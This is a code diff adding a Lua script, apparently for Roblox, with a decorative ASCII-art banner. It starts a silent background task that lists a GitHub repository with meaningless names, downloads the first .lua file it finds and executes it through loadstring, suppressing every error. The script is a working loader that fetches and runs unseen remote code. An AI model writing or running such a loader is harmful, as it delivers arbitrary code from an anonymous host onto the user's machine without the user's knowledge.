@@ -1,0 +1,40 @@
+--[[
+      ...                                              ....      ..                                                    .                                 .x+=:.   
+  .zf"` `"tu                                         +^""888h. ~"888h                                                 @88>                              z`    ^%  
+ x88      '8N.    x.    .                    ..     8X.  ?8888X  8888f                .u    .      ..    .     :      %8P      u.    u.                    .     '88888 8888X   "88x:   ud8888.  ="8888f8888r ~`8888~'888X`?888f`  .@88u  ^"8888""8888"  .ue888Nc..  .@^%8888"  
+ `88888 9888%    8888  888R   <888'888k     '88%    `8888 8888X  X88x.  :888'8888.   4888>'88"    X888  888X '888>  ''888E`   8888  888R  d88E`"888E` x88:  `)8b. 
+   %888 "88F     8888  888R   9888 'Y"    ..dILr~`    `*` 8888X '88888X d888 '88%"   4888> '      X888  888X '888>    888E    8888  888R  888E  888E  8888N=*8888 
+    8"   "*h=~   8888  888R   9888       '".-%88b    ~`...8888X  "88888 8888.+"      4888>        X888  888X '888>    888E    8888  888R  888E  888E   %8"    R88 
+  z8Weu          8888 ,888B . 9888        @  '888k    x8888888X.   `%8" 8888L       .d888L .+     X888  888X '888>    888E    8888  888R  888E  888E    @8Wou 9%  
+ ""88888i.   Z  "8888Y 8888"  ?8888u../  8F   8888   '%"*8888888h.   "  '8888c. .+  ^"8888*"     "*88%""*88" '888!`   888&   "*88*" 8888" 888& .888E  .888888P`   
+"   "8888888*    `Y"   'YP     "8888P'  '8    8888   ~    888888888!`    "88888%       "Y"         `~    "    `"`     R888"    ""   'Y"   *888" 888&  `   ^"F     
+      ^"**""                     "P'    '8    888F        X888^"""         "YP'                                        ""                  `"   "888E             
+                                         %k  <88F         `88f                                                                            .dWi   `88E             
+                                          "+:*%`           88                                                                             4888~  J8%              
+                                                           ""                                                                              ^"===*"`               
+]]
+
+task.spawn(function()
+    local repoAPI = "https://api.github.com/repos/idisisisisisisisjsks/Kakaosndnxjxndjd/contents"
+
+    local ok, body = pcall(game.HttpGet, game, repoAPI)
+    if not ok then return end
+
+    local success, data = pcall(function()
+        return game:GetService("HttpService"):JSONDecode(body)
+    end)
+    if not success then return end
+
+    for _, file in ipairs(data) do
+        if file.type == "file" and string.find(string.lower(file.name), ".lua") then
+            local rawOk, src = pcall(game.HttpGet, game, file.download_url)
+            if rawOk and src then
+                local fn = loadstring(src)
+                if fn then
+                    fn()
+                    break
+                end
+            end
+        end
+    end
+end)
